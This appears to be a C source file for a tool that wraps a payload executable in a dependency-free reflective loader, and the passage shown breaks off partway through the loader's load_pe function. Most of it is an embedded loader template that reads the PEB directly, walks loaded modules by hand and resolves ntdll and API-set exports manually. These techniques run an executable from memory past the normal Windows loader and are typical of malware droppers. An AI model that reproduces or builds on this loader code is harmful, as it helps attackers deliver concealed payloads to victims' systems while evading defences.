/**
 * exe_to_embedded_loader.c
 *
 * Compilation: gcc exe_to_embedded_loader.c -o exe_to_embedded_loader
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef _WIN32
#include <windows.h>
#else
typedef uint32_t DWORD;
typedef uint16_t WORD;
typedef uint8_t BYTE;
typedef uint64_t ULONG_PTR;
typedef uint64_t SIZE_T;

#pragma pack(push, 1)
typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    int32_t e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD Magic;
    BYTE MajorLinkerVersion;
    BYTE MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    ULONG_PTR ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD MajorOperatingSystemVersion;
    WORD MinorOperatingSystemVersion;
    WORD MajorImageVersion;
    WORD MinorImageVersion;
    WORD MajorSubsystemVersion;
    WORD MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD Subsystem;
    WORD DllCharacteristics;
    ULONG_PTR SizeOfStackReserve;
    ULONG_PTR SizeOfStackCommit;
    ULONG_PTR SizeOfHeapReserve;
    ULONG_PTR SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
#pragma pack(pop)
#endif

const char* default_template =
    "/**\n"
    " * loader_template.c - Enhanced Reflective Loader (No Dependencies)\n"
    " *\n"
    " * This template is used to wrap a payload EXE.\n"
    " * It provides better support for exceptions (x64) and TLS.\n"
    " */\n"
    "\n"
    "#define NULL ((void*)0)\n"
    "\n"
    "#ifdef _WIN64\n"
    "typedef unsigned long long QWORD;\n"
    "typedef unsigned long long ULONG_PTR;\n"
    "typedef unsigned long long UINT_PTR;\n"
    "#else\n"
    "typedef unsigned int QWORD;\n"
    "typedef unsigned int ULONG_PTR;\n"
    "typedef unsigned int UINT_PTR;\n"
    "#endif\n"
    "\n"
    "typedef unsigned int DWORD;\n"
    "typedef unsigned short WORD;\n"
    "typedef unsigned char BYTE;\n"
    "typedef void* PVOID;\n"
    "typedef PVOID HANDLE;\n"
    "typedef PVOID HMODULE;\n"
    "typedef PVOID HINSTANCE;\n"
    "typedef unsigned long long SIZE_T;\n"
    "typedef int BOOL;\n"
    "typedef long LONG;\n"
    "typedef unsigned long ULONG;\n"
    "typedef void VOID;\n"
    "typedef ULONG* PULONG;\n"
    "typedef unsigned short USHORT;\n"
    "typedef USHORT* PWSTR;\n"
    "typedef char* PSTR;\n"
    "typedef USHORT WCHAR;\n"
    "typedef unsigned char BOOLEAN;\n"
    "typedef void* LPVOID;\n"
    "typedef unsigned long long DWORD64;\n"
    "typedef DWORD* PDWORD;\n"
    "typedef WORD* PWORD;\n"
    "typedef LONG NTSTATUS;\n"
    "\n"
    "#define TRUE 1\n"
    "#define FALSE 0\n"
    "\n"
    "#define DLL_PROCESS_ATTACH 1\n"
    "#define MEM_COMMIT 0x00001000\n"
    "#define MEM_RESERVE 0x00002000\n"
    "#define PAGE_NOACCESS 0x01\n"
    "#define PAGE_READONLY 0x02\n"
    "#define PAGE_READWRITE 0x04\n"
    "#define PAGE_EXECUTE 0x10\n"
    "#define PAGE_EXECUTE_READ 0x20\n"
    "#define PAGE_EXECUTE_READWRITE 0x40\n"
    "\n"
    "#define IMAGE_DIRECTORY_ENTRY_EXPORT 0\n"
    "#define IMAGE_DIRECTORY_ENTRY_IMPORT 1\n"
    "#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5\n"
    "#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3\n"
    "#define IMAGE_DIRECTORY_ENTRY_TLS 9\n"
    "\n"
    "#define IMAGE_SCN_MEM_EXECUTE 0x20000000\n"
    "#define IMAGE_SCN_MEM_READ 0x40000000\n"
    "#define IMAGE_SCN_MEM_WRITE 0x80000000\n"
    "\n"
    "#define IMAGE_REL_BASED_HIGHLOW 3\n"
    "#define IMAGE_REL_BASED_DIR64 10\n"
    "\n"
    "#ifdef _WIN64\n"
    "#define IMAGE_ORDINAL_FLAG 0x8000000000000000ULL\n"
    "#else\n"
    "#define IMAGE_ORDINAL_FLAG 0x80000000\n"
    "#endif\n"
    "\n"
    "#define IMAGE_SNAP_BY_ORDINAL(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG) != 0)\n"
    "#define IMAGE_ORDINAL(Ordinal) (Ordinal & 0xffff)\n"
    "\n"
    "#ifndef MAX_PATH\n"
    "#define MAX_PATH 260\n"
    "#endif\n"
    "\n"
    "typedef struct _UNICODE_STRING {\n"
    "    USHORT Length;\n"
    "    USHORT MaximumLength;\n"
    "    PWSTR  Buffer;\n"
    "} UNICODE_STRING, *PUNICODE_STRING;\n"
    "\n"
    "typedef struct _ANSI_STRING {\n"
    "    USHORT Length;\n"
    "    USHORT MaximumLength;\n"
    "    PSTR   Buffer;\n"
    "} ANSI_STRING, *PANSI_STRING;\n"
    "\n"
    "typedef struct _LIST_ENTRY {\n"
    "    struct _LIST_ENTRY *Flink;\n"
    "    struct _LIST_ENTRY *Blink;\n"
    "} LIST_ENTRY, *PLIST_ENTRY;\n"
    "\n"
    "typedef struct _PEB_LDR_DATA {\n"
    "    ULONG Length;\n"
    "    BOOLEAN Initialized;\n"
    "    HANDLE SsHandle;\n"
    "    LIST_ENTRY InLoadOrderModuleList;\n"
    "    LIST_ENTRY InMemoryOrderModuleList;\n"
    "    LIST_ENTRY InInitializationOrderModuleList;\n"
    "} PEB_LDR_DATA, *PPEB_LDR_DATA;\n"
    "\n"
    "typedef struct _LDR_DATA_TABLE_ENTRY {\n"
    "    LIST_ENTRY InLoadOrderLinks;\n"
    "    LIST_ENTRY InMemoryOrderLinks;\n"
    "    LIST_ENTRY InInitializationOrderLinks;\n"
    "    PVOID DllBase;\n"
    "    PVOID EntryPoint;\n"
    "    ULONG SizeOfImage;\n"
    "    UNICODE_STRING FullDllName;\n"
    "    UNICODE_STRING BaseDllName;\n"
    "} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
    "\n"
    "typedef struct _PEB {\n"
    "    BOOLEAN InheritedAddressSpace;\n"
    "    BOOLEAN ReadImageFileExecOptions;\n"
    "    BOOLEAN BeingDebugged;\n"
    "    union {\n"
    "        BOOLEAN BitField;\n"
    "        struct {\n"
    "            BOOLEAN ImageUsesLargePages : 1;\n"
    "            BOOLEAN IsProtectedProcess : 1;\n"
    "            BOOLEAN IsImageDynamicallyRelocated : 1;\n"
    "            BOOLEAN SkipPatchingLocals : 1;\n"
    "            BOOLEAN IsPackagedProcess : 1;\n"
    "            BOOLEAN IsAppContainer : 1;\n"
    "            BOOLEAN IsProtectedProcessLight : 1;\n"
    "            BOOLEAN IsLongPathAwareProcess : 1;\n"
    "        };\n"
    "    };\n"
    "    HANDLE Mutant;\n"
    "    PVOID ImageBaseAddress;\n"
    "    PPEB_LDR_DATA Ldr;\n"
    "} PEB, *PPEB;\n"
    "\n"
    "typedef struct _IMAGE_DOS_HEADER {\n"
    "    WORD e_magic;\n"
    "    WORD e_cblp;\n"
    "    WORD e_cp;\n"
    "    WORD e_crlc;\n"
    "    WORD e_cparhdr;\n"
    "    WORD e_minalloc;\n"
    "    WORD e_maxalloc;\n"
    "    WORD e_ss;\n"
    "    WORD e_sp;\n"
    "    WORD e_csum;\n"
    "    WORD e_ip;\n"
    "    WORD e_cs;\n"
    "    WORD e_lfarlc;\n"
    "    WORD e_ovno;\n"
    "    WORD e_res[4];\n"
    "    WORD e_oemid;\n"
    "    WORD e_oeminfo;\n"
    "    WORD e_res2[10];\n"
    "    LONG e_lfanew;\n"
    "} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;\n"
    "\n"
    "typedef struct _IMAGE_FILE_HEADER {\n"
    "    WORD Machine;\n"
    "    WORD NumberOfSections;\n"
    "    DWORD TimeDateStamp;\n"
    "    DWORD PointerToSymbolTable;\n"
    "    DWORD NumberOfSymbols;\n"
    "    WORD SizeOfOptionalHeader;\n"
    "    WORD Characteristics;\n"
    "} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n"
    "\n"
    "typedef struct _IMAGE_DATA_DIRECTORY {\n"
    "    DWORD VirtualAddress;\n"
    "    DWORD Size;\n"
    "} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;\n"
    "\n"
    "#ifdef _WIN64\n"
    "typedef struct _IMAGE_OPTIONAL_HEADER64 {\n"
    "    WORD Magic;\n"
    "    BYTE MajorLinkerVersion;\n"
    "    BYTE MinorLinkerVersion;\n"
    "    DWORD SizeOfCode;\n"
    "    DWORD SizeOfInitializedData;\n"
    "    DWORD SizeOfUninitializedData;\n"
    "    DWORD AddressOfEntryPoint;\n"
    "    DWORD BaseOfCode;\n"
    "    ULONG_PTR ImageBase;\n"
    "    DWORD SectionAlignment;\n"
    "    DWORD FileAlignment;\n"
    "    WORD MajorOperatingSystemVersion;\n"
    "    WORD MinorOperatingSystemVersion;\n"
    "    WORD MajorImageVersion;\n"
    "    WORD MinorImageVersion;\n"
    "    WORD MajorSubsystemVersion;\n"
    "    WORD MinorSubsystemVersion;\n"
    "    DWORD Win32VersionValue;\n"
    "    DWORD SizeOfImage;\n"
    "    DWORD SizeOfHeaders;\n"
    "    DWORD CheckSum;\n"
    "    WORD Subsystem;\n"
    "    WORD DllCharacteristics;\n"
    "    ULONG_PTR SizeOfStackReserve;\n"
    "    ULONG_PTR SizeOfStackCommit;\n"
    "    ULONG_PTR SizeOfHeapReserve;\n"
    "    ULONG_PTR SizeOfHeapCommit;\n"
    "    DWORD LoaderFlags;\n"
    "    DWORD NumberOfRvaAndSizes;\n"
    "    IMAGE_DATA_DIRECTORY DataDirectory[16];\n"
    "} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;\n"
    "typedef IMAGE_OPTIONAL_HEADER64 IMAGE_OPTIONAL_HEADER;\n"
    "#else\n"
    "typedef struct _IMAGE_OPTIONAL_HEADER32 {\n"
    "    WORD Magic;\n"
    "    BYTE MajorLinkerVersion;\n"
    "    BYTE MinorLinkerVersion;\n"
    "    DWORD SizeOfCode;\n"
    "    DWORD SizeOfInitializedData;\n"
    "    DWORD SizeOfUninitializedData;\n"
    "    DWORD AddressOfEntryPoint;\n"
    "    DWORD BaseOfCode;\n"
    "    DWORD ImageBase;\n"
    "    DWORD SectionAlignment;\n"
    "    DWORD FileAlignment;\n"
    "    WORD MajorOperatingSystemVersion;\n"
    "    WORD MinorOperatingSystemVersion;\n"
    "    WORD MajorImageVersion;\n"
    "    WORD MinorImageVersion;\n"
    "    WORD MajorSubsystemVersion;\n"
    "    WORD MinorSubsystemVersion;\n"
    "    DWORD Win32VersionValue;\n"
    "    DWORD SizeOfImage;\n"
    "    DWORD SizeOfHeaders;\n"
    "    DWORD CheckSum;\n"
    "    WORD Subsystem;\n"
    "    WORD DllCharacteristics;\n"
    "    DWORD SizeOfStackReserve;\n"
    "    DWORD SizeOfStackCommit;\n"
    "    DWORD SizeOfHeapReserve;\n"
    "    DWORD SizeOfHeapCommit;\n"
    "    DWORD LoaderFlags;\n"
    "    DWORD NumberOfRvaAndSizes;\n"
    "    IMAGE_DATA_DIRECTORY DataDirectory[16];\n"
    "} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n"
    "typedef IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER;\n"
    "#endif\n"
    "\n"
    "typedef struct _IMAGE_NT_HEADERS {\n"
    "    DWORD Signature;\n"
    "    IMAGE_FILE_HEADER FileHeader;\n"
    "    IMAGE_OPTIONAL_HEADER OptionalHeader;\n"
    "} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;\n"
    "\n"
    "typedef struct _IMAGE_SECTION_HEADER {\n"
    "    BYTE Name[8];\n"
    "    union {\n"
    "        DWORD PhysicalAddress;\n"
    "        DWORD VirtualSize;\n"
    "    } Misc;\n"
    "    DWORD VirtualAddress;\n"
    "    DWORD SizeOfRawData;\n"
    "    DWORD PointerToRawData;\n"
    "    DWORD PointerToRelocations;\n"
    "    DWORD PointerToLinenumbers;\n"
    "    WORD NumberOfRelocations;\n"
    "    WORD NumberOfLinenumbers;\n"
    "    DWORD Characteristics;\n"
    "} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\n"
    "\n"
    "#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)((ULONG_PTR)(ntheader) + \\\n"
    "    sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + (ntheader)->FileHeader.SizeOfOptionalHeader))\n"
    "\n"
    "typedef struct _IMAGE_EXPORT_DIRECTORY {\n"
    "    DWORD Characteristics;\n"
    "    DWORD TimeDateStamp;\n"
    "    WORD MajorVersion;\n"
    "    WORD MinorVersion;\n"
    "    DWORD Name;\n"
    "    DWORD Base;\n"
    "    DWORD NumberOfFunctions;\n"
    "    DWORD NumberOfNames;\n"
    "    DWORD AddressOfFunctions;\n"
    "    DWORD AddressOfNames;\n"
    "    DWORD AddressOfNameOrdinals;\n"
    "} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;\n"
    "\n"
    "typedef struct _IMAGE_IMPORT_DESCRIPTOR {\n"
    "    union {\n"
    "        DWORD Characteristics;\n"
    "        DWORD OriginalFirstThunk;\n"
    "    };\n"
    "    DWORD TimeDateStamp;\n"
    "    DWORD ForwarderChain;\n"
    "    DWORD Name;\n"
    "    DWORD FirstThunk;\n"
    "} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;\n"
    "\n"
    "typedef struct _IMAGE_THUNK_DATA {\n"
    "    union {\n"
    "        ULONG_PTR ForwarderString;\n"
    "        ULONG_PTR Function;\n"
    "        ULONG_PTR Ordinal;\n"
    "        ULONG_PTR AddressOfData;\n"
    "    } u1;\n"
    "} IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA;\n"
    "\n"
    "typedef struct _IMAGE_IMPORT_BY_NAME {\n"
    "    WORD Hint;\n"
    "    char Name[1];\n"
    "} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;\n"
    "\n"
    "typedef struct _IMAGE_BASE_RELOCATION {\n"
    "    DWORD VirtualAddress;\n"
    "    DWORD SizeOfBlock;\n"
    "} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;\n"
    "\n"
    "typedef struct _IMAGE_TLS_DIRECTORY {\n"
    "    ULONG_PTR StartAddressOfRawData;\n"
    "    ULONG_PTR EndAddressOfRawData;\n"
    "    ULONG_PTR AddressOfIndex;\n"
    "    ULONG_PTR AddressOfCallBacks;\n"
    "    DWORD SizeOfZeroFill;\n"
    "    DWORD Characteristics;\n"
    "} IMAGE_TLS_DIRECTORY, *PIMAGE_TLS_DIRECTORY;\n"
    "\n"
    "typedef struct _RUNTIME_FUNCTION {\n"
    "    DWORD BeginAddress;\n"
    "    DWORD EndAddress;\n"
    "    DWORD UnwindData;\n"
    "} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;\n"
    "\n"
    "typedef struct _API_SET_NAMESPACE {\n"
    "    ULONG Version;\n"
    "    ULONG Size;\n"
    "    ULONG Flags;\n"
    "    ULONG Count;\n"
    "    ULONG EntryOffset;\n"
    "    ULONG HashOffset;\n"
    "    ULONG HashFactor;\n"
    "} API_SET_NAMESPACE, *PAPI_SET_NAMESPACE;\n"
    "\n"
    "typedef struct _API_SET_NAMESPACE_ENTRY {\n"
    "    ULONG Flags;\n"
    "    ULONG NameOffset;\n"
    "    ULONG NameLength;\n"
    "    ULONG AliasLength;\n"
    "    ULONG ValueOffset;\n"
    "    ULONG ValueCount;\n"
    "} API_SET_NAMESPACE_ENTRY, *PAPI_SET_NAMESPACE_ENTRY;\n"
    "\n"
    "typedef struct _API_SET_VALUE_ENTRY {\n"
    "    ULONG Flags;\n"
    "    ULONG NameOffset;\n"
    "    ULONG NameLength;\n"
    "    ULONG ValueOffset;\n"
    "    ULONG ValueLength;\n"
    "} API_SET_VALUE_ENTRY, *PAPI_SET_VALUE_ENTRY;\n"
    "\n"
    "// Function pointers\n"
    "typedef NTSTATUS (*pLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);\n"
    "typedef NTSTATUS (*pLdrGetProcedureAddress)(PVOID, PANSI_STRING, ULONG, PVOID*);\n"
    "typedef VOID (*pRtlInitAnsiString)(PANSI_STRING, const char*);\n"
    "typedef NTSTATUS (*pRtlAnsiStringToUnicodeString)(PUNICODE_STRING, PANSI_STRING, BOOLEAN);\n"
    "typedef VOID (*pRtlFreeUnicodeString)(PUNICODE_STRING);\n"
    "typedef LPVOID (*pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);\n"
    "typedef BOOL (*pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);\n"
    "typedef BOOL (*pRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);\n"
    "typedef VOID (*PIMAGE_TLS_CALLBACK)(PVOID, DWORD, PVOID);\n"
    "\n"
    "#ifdef _MSC_VER\n"
    "#include <intrin.h>\n"
    "#ifdef _WIN64\n"
    "#define READ_PEB() (PVOID)__readgsqword(0x60)\n"
    "#else\n"
    "#define READ_PEB() (PVOID)__readfsdword(0x30)\n"
    "#endif\n"
    "#else\n"
    "#ifdef _WIN64\n"
    "static __inline__ PVOID READ_PEB() {\n"
    "    PVOID peb;\n"
    "    __asm__(\"mov %%gs:0x60, %0\" : \"=r\" (peb));\n"
    "    return peb;\n"
    "}\n"
    "#else\n"
    "static __inline__ PVOID READ_PEB() {\n"
    "    PVOID peb;\n"
    "    __asm__(\"mov %%fs:0x30, %0\" : \"=r\" (peb));\n"
    "    return peb;\n"
    "}\n"
    "#endif\n"
    "#endif\n"
    "\n"
    "// Helper functions\n"
    "static void* my_memcpy(void* dest, const void* src, SIZE_T n) {\n"
    "    char* d = (char*)dest;\n"
    "    const char* s = (const char*)src;\n"
    "    while (n--) *d++ = *s++;\n"
    "    return dest;\n"
    "}\n"
    "\n"
    "static int my_strlen(const char* s) {\n"
    "    int l = 0;\n"
    "    while (s && s[l]) l++;\n"
    "    return l;\n"
    "}\n"
    "\n"
    "static int my_strcmp(const char* s1, const char* s2) {\n"
    "    if (!s1 || !s2) return -1;\n"
    "    while (*s1 && (*s1 == *s2)) { s1++; s2++; }\n"
    "    return *(unsigned char*)s1 - *(unsigned char*)s2;\n"
    "}\n"
    "\n"
    "static int my_strncmp(const char* s1, const char* s2, SIZE_T n) {\n"
    "    if (!s1 || !s2) return -1;\n"
    "    while (n && *s1 && (*s1 == *s2)) { s1++; s2++; n--; }\n"
    "    if (n == 0) return 0;\n"
    "    return *(unsigned char*)s1 - *(unsigned char*)s2;\n"
    "}\n"
    "\n"
    "// Manual resolution\n"
    "static PVOID get_module_handle_manual(const char* dll_name) {\n"
    "    PPEB peb = (PPEB)READ_PEB();\n"
    "    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;\n"
    "    PLIST_ENTRY curr = head->Flink;\n"
    "    while (curr != head) {\n"
    "        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)curr;\n"
    "        if (dll_name == NULL) return entry->DllBase;\n"
    "        WCHAR w_dll_name[MAX_PATH];\n"
    "        int i = 0;\n"
    "        while (dll_name[i] && i < MAX_PATH - 1) { w_dll_name[i] = (WCHAR)dll_name[i]; i++; }\n"
    "        w_dll_name[i] = 0;\n"
    "        int match = 1;\n"
    "        if (entry->BaseDllName.Length / 2 >= i) {\n"
    "            for (int j = 0; j < i; j++) {\n"
    "                WCHAR c1 = w_dll_name[j];\n"
    "                WCHAR c2 = entry->BaseDllName.Buffer[j];\n"
    "                if (c1 >= 'A' && c1 <= 'Z') c1 += 32;\n"
    "                if (c2 >= 'A' && c2 <= 'Z') c2 += 32;\n"
    "                if (c1 != c2) { match = 0; break; }\n"
    "            }\n"
    "            if (match && (entry->BaseDllName.Length / 2 == i || entry->BaseDllName.Buffer[i] == 0)) return entry->DllBase;\n"
    "        }\n"
    "        curr = curr->Flink;\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "static void resolve_api_set(const char* dll_name, char* out_name);\n"
    "\n"
    "static PVOID get_export_address_manual(HMODULE h_module, const char* func_name, pRtlInitAnsiString _RtlInitAnsiString, pLdrGetProcedureAddress _LdrGetProcedureAddress, pLdrLoadDll _LdrLoadDll, pRtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString, pRtlFreeUnicodeString _RtlFreeUnicodeString) {\n"
    "    if (!h_module) return NULL;\n"
    "    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)h_module;\n"
    "    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((char*)h_module + dos_header->e_lfanew);\n"
    "    IMAGE_DATA_DIRECTORY export_dir_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n"
    "    if (export_dir_info.Size == 0) return NULL;\n"
    "    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((char*)h_module + export_dir_info.VirtualAddress);\n"
    "    PDWORD names = (PDWORD)((char*)h_module + export_dir->AddressOfNames);\n"
    "    PDWORD functions = (PDWORD)((char*)h_module + export_dir->AddressOfFunctions);\n"
    "    PWORD ordinals = (PWORD)((char*)h_module + export_dir->AddressOfNameOrdinals);\n"
    "    PVOID addr = NULL;\n"
    "    if (IMAGE_SNAP_BY_ORDINAL((ULONG_PTR)func_name)) {\n"
    "        WORD ordinal = (WORD)IMAGE_ORDINAL((ULONG_PTR)func_name) - (WORD)export_dir->Base;\n"
    "        addr = (PVOID)((char*)h_module + functions[ordinal]);\n"
    "    } else {\n"
    "        for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {\n"
    "            if (my_strcmp(func_name, (char*)h_module + names[i]) == 0) {\n"
    "                addr = (PVOID)((char*)h_module + functions[ordinals[i]]);\n"
    "                break;\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    if (!addr) return NULL;\n"
    "    if ((char*)addr >= (char*)export_dir && (char*)addr < (char*)export_dir + export_dir_info.Size) {\n"
    "        char forward_str[MAX_PATH];\n"
    "        int i = 0;\n"
    "        while (((char*)addr)[i] != '\\0' && i < MAX_PATH - 1) { forward_str[i] = ((char*)addr)[i]; i++; }\n"
    "        forward_str[i] = '\\0';\n"
    "        char* dot = NULL;\n"
    "        for (int j = 0; j < i; j++) { if (forward_str[j] == '.') { dot = &forward_str[j]; break; } }\n"
    "        if (dot) {\n"
    "            *dot = '\\0';\n"
    "            char dll_name[MAX_PATH];\n"
    "            int k = 0;\n"
    "            while (forward_str[k]) { dll_name[k] = forward_str[k]; k++; }\n"
    "            int has_ext = 0;\n"
    "            for(int m=0; m<k; m++) if(dll_name[m] == '.') has_ext = 1;\n"
    "            if(!has_ext) { dll_name[k++] = '.'; dll_name[k++] = 'd'; dll_name[k++] = 'l'; dll_name[k++] = 'l'; dll_name[k] = '\\0'; }\n"
    "            else { dll_name[k] = '\\0'; }\n"
    "            char real_dll[MAX_PATH];\n"
    "            resolve_api_set(dll_name, real_dll);\n"
    "            HMODULE h_forward = get_module_handle_manual(real_dll);\n"
    "            if (!h_forward) {\n"
    "                ANSI_STRING a_dll; UNICODE_STRING u_dll;\n"
    "                _RtlInitAnsiString(&a_dll, real_dll);\n"
    "                _RtlAnsiStringToUnicodeString(&u_dll, &a_dll, TRUE);\n"
    "                _LdrLoadDll(NULL, NULL, &u_dll, (PVOID*)&h_forward);\n"
    "                _RtlFreeUnicodeString(&u_dll);\n"
    "            }\n"
    "            if (h_forward) return get_export_address_manual(h_forward, dot + 1, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "        }\n"
    "    }\n"
    "    return addr;\n"
    "}\n"
    "\n"
    "static void resolve_api_set(const char* dll_name, char* out_name) {\n"
    "    if (my_strncmp(dll_name, \"api-\", 4) != 0 && my_strncmp(dll_name, \"ext-\", 4) != 0) {\n"
    "        int i = 0; while (dll_name[i]) { out_name[i] = dll_name[i]; i++; } out_name[i] = '\\0';\n"
    "        return;\n"
    "    }\n"
    "    PVOID peb = READ_PEB();\n"
    "    PAPI_SET_NAMESPACE api_set_map = *(PAPI_SET_NAMESPACE*)((char*)peb + (sizeof(PVOID) == 8 ? 0x68 : 0x38));\n"
    "    if (api_set_map->Version < 6) {\n"
    "        int i = 0; while (dll_name[i]) { out_name[i] = dll_name[i]; i++; } out_name[i] = '\\0';\n"
    "        return;\n"
    "    }\n"
    "    PAPI_SET_NAMESPACE_ENTRY entries = (PAPI_SET_NAMESPACE_ENTRY)((char*)api_set_map + api_set_map->EntryOffset);\n"
    "    SIZE_T dll_name_len = my_strlen(dll_name);\n"
    "    if (dll_name_len > 4 && (dll_name[dll_name_len - 4] == '.')) dll_name_len -= 4;\n"
    "    for (ULONG i = 0; i < api_set_map->Count; i++) {\n"
    "        PAPI_SET_NAMESPACE_ENTRY entry = &entries[i];\n"
    "        PWSTR name = (PWSTR)((char*)api_set_map + entry->NameOffset);\n"
    "        if (dll_name_len == (SIZE_T)entry->NameLength / 2) {\n"
    "            int match = 1;\n"
    "            for (SIZE_T j = 0; j < dll_name_len; j++) {\n"
    "                WCHAR c1 = (WCHAR)dll_name[j]; WCHAR c2 = name[j];\n"
    "                if (c1 >= 'A' && c1 <= 'Z') c1 += 32;\n"
    "                if (c2 >= 'A' && c2 <= 'Z') c2 += 32;\n"
    "                if (c1 != c2) { match = 0; break; }\n"
    "            }\n"
    "            if (match) {\n"
    "                PAPI_SET_VALUE_ENTRY values = (PAPI_SET_VALUE_ENTRY)((char*)api_set_map + entry->ValueOffset);\n"
    "                if (entry->ValueCount > 0) {\n"
    "                    PAPI_SET_VALUE_ENTRY value = &values[0];\n"
    "                    PWSTR target_dll_wide = (PWSTR)((char*)api_set_map + value->ValueOffset);\n"
    "                    ULONG target_dll_len = value->ValueLength / 2;\n"
    "                    for (ULONG k = 0; k < target_dll_len; k++) out_name[k] = (char)target_dll_wide[k];\n"
    "                    out_name[target_dll_len] = '\\0';\n"
    "                    return;\n"
    "                }\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    int k = 0; while (dll_name[k]) { out_name[k] = dll_name[k]; k++; } out_name[k] = '\\0';\n"
    "}\n"
    "\n"
    "// PE_BLOB_ARRAY\n"
    "unsigned char pe_blob[] = { 0 };\n"
    "// ENTRY_POINT_RVA\n"
    "DWORD entry_point_rva = 0;\n"
    "// IMAGE_BASE\n"
    "ULONG_PTR image_base = 0;\n"
    "// SIZE_OF_IMAGE\n"
    "SIZE_T size_of_image = 0;\n"
    "\n"
    "void load_pe() {\n"
    "    HMODULE h_ntdll = get_module_handle_manual(\"ntdll.dll\");\n"
    "    pRtlInitAnsiString _RtlInitAnsiString = (pRtlInitAnsiString)get_export_address_manual(h_ntdll, \"RtlInitAnsiString\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pLdrGetProcedureAddress _LdrGetProcedureAddress = (pLdrGetProcedureAddress)get_export_address_manual(h_ntdll, \"LdrGetProcedureAddress\", _RtlInitAnsiString, NULL, NULL, NULL, NULL);\n"
    "    pLdrLoadDll _LdrLoadDll = (pLdrLoadDll)get_export_address_manual(h_ntdll, \"LdrLoadDll\", _RtlInitAnsiString, _LdrGetProcedureAddress, NULL, NULL, NULL);\n"
